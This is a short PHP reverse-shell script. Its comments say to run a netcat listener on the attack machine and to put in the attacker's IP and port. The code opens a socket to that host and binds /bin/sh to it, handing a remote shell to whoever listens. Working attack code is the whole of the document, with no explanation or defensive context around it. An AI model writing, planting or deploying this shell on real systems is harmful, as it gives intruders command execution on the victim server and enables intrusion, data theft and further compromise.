<?php
//listener on attack machine: nc-lvp 4444
//replace whit your attacker ip and port

$ip = '127.0.0.1';
$port = 4444;
$sock = fsockopen($ip, $port);
if ($sock) {
    fwrite($sock, "Connection enstabilished from reverse shell\n");
    $proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
}